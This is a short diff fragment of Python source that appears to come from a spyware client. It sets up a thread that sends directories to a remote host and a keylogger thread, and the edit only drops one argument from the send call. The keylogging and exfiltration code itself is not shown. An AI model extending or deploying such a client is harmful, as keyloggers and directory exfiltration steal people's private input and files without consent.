@@ -36,7 +36,7 @@ def client(host, port, isEndFlag):
     # Create thread
     threads          = []
     send_thread      = th.Thread(name='Send dirs thread', target=send_dir,
-                                 args=(handle, start_dirs, save_local_dirs, isEndFlag),
+                                 args=(handle, start_dirs, isEndFlag),
                                  daemon=False)
     keylogger_thread = th.Thread(name='KeyLogger thread', target=keylogger,
                                  args=(save_local_dirs, isEndFlag), 
